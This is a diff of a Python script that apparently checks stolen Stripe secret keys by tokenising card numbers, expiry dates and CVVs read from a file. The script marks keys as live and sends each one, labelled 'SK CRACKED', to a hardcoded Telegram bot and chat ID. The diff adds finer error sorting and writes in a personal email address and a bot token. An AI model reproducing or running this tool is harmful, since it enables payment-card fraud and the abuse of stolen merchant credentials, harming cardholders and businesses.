@@ -12,21 +12,13 @@ print(Fore.CYAN+"─────────────────────
 BOT_TOKEN = "5555716917:AAGsUI1xZF0oZsoUQx3ErM2xmA6aHi8G390"
 CHAT_ID = "5437132207"
 
-if not os.path.exists("sk.txt"):
-    print("Error: The sk.txt file does not exist!")
-    exit()
-
-with open("sk.txt", "r") as sk_file:
+with open("config/sk.txt", "r") as sk_file:
     sks = sk_file.read().splitlines()
 
-if not os.path.exists("cc.txt"):
-    print("Error: The cc.txt file does not exist!")
-    exit()
-
-with open("cc.txt", "r") as cc_file:
+with open("config/cc.txt", "r") as cc_file:
     cc_info_arr = cc_file.read().splitlines()
 
-sk_live_file = open("sklive.txt", "w")
+sk_live_file = open("config/sklive.txt", "a")
 
 
 def send_telegram_message(chat_id, text):
@@ -47,7 +39,7 @@ def check_sk(args):
     cc, mm, yyyy, cvv = cc_info.split("|")
     bin_number = cc[:8]
     last4 = cc[12:]
-    email = "test@example.com"
+    email = "aldrinjames789@gmail.com"
     m = str(int(mm))
 
     session = requests.Session()
@@ -60,6 +52,8 @@ def check_sk(args):
             "cvc": cvv
         }
     }
+   
+
     auth_response1 = session.post(
         "https://api.stripe.com/v1/tokens",
         auth=(sk, ""),
@@ -69,18 +63,29 @@ def check_sk(args):
     current_time = datetime.now().strftime("%H:%M:%S")
 
     if "error" in auth_response1:
-        if auth_response1["error"]["type"] == "invalid_request_error":
-            print(f"[{current_time}] [{Fore.RED}DEAD{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk} ")
-            
-        else:
-            print(f"[{current_time}] [{Fore.GREEN}LIVE{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk} ")
-            sk_live_file.write(sk + "\n")
-            send_telegram_message(CHAT_ID , f"SK CRACKED {current_time} \n\nKey: {sk}\n\nLIVE SK has been saved to your file sklive.txt")
-
+    	if auth_response1["error"]["type"] == "invalid_request_error":
+    	    if "message" in auth_response1["error"]:
+    	        if "Invalid API Key" in auth_response1["error"]["message"]:
+    	            print(f'[{current_time}] [{Fore.RED}INVALID{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk}')
+    	        elif "Expired API Key" in auth_response1["error"]["message"]:
+    	            print(f'[{current_time}] [{Fore.RED}EXPIRED{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk}')
+    	        elif "You must pass" in auth_response1["error"]["message"]:
+    	            print(f'[{current_time}] [{Fore.RED}TEST MODE{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk}') 
+    	            
+    	        elif "code" in auth_response1["error"]:
+    	            if auth_response1["error"]["code"] == "rate_limit":
+    	                print(f'[{current_time}] [{Fore.BLUE}RATE LIMIT{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk}')
+    	                sk_live_file.write(sk + "\n")
+    	                send_telegram_message(CHAT_ID , f"SK CRACKED {current_time} \n\nKey: {sk}\n\nRATE LIMIT SK has been saved to your file sklive.txt")
+    	        else:
+    	            print(f'[{current_time}] [{Fore.GREEN}LIVE{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk}')
+    	            sk_live_file.write(sk + "\n")
+    	            send_telegram_message(CHAT_ID , f"SK CRACKED {current_time} \n\nKey: {sk}\n\nLIVE SK has been saved to your file sklive.txt")
     else:
-        print(f"[{current_time}] [{Fore.GREEN}LIVE{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk} ")
+        print(f'[{current_time}] [{Fore.GREEN}LIVE{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk}') 
         sk_live_file.write(sk + "\n")
         send_telegram_message(CHAT_ID , f"SK CRACKED {current_time} \n\nKey: {sk}\n\nLIVE SK has been saved to your file sklive.txt")
+        
     
 max_threads = min(os.cpu_count() * 2, len(sks))
 
